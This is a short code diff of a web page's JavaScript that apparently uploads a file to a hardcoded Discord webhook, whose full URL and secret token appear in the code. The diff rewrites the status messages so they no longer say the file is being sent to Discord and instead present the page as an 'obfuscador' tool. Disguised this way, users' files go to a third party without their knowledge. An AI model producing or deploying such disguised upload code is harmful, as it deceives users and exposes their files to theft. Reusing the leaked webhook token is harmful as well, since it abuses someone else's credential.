@@ -236,7 +236,7 @@
             const webhookUrl = 'https://discord.com/api/webhooks/1288980879397621791/iK325TYN4nvqY4Pls61Uq6K1hP-t2vEQn77Qvif29SVClz0b-CWVjpqHyEZf_LAhiZIa';
             const statusDiv = document.getElementById('status');
 
-            statusDiv.innerHTML = "Enviando para o Discord...";
+            statusDiv.innerHTML = "obfuscador...";
             statusDiv.classList.remove('status-error');
             statusDiv.classList.remove('status-success');
 
@@ -246,7 +246,7 @@
             })
             .then(response => response.json())
             .then(data => {
-                statusDiv.innerHTML = "Arquivo enviado para o Discord!";
+                statusDiv.innerHTML = "Arquivo obfuscador!";
                 statusDiv.classList.add('status-success');
             })
             .catch(error => {
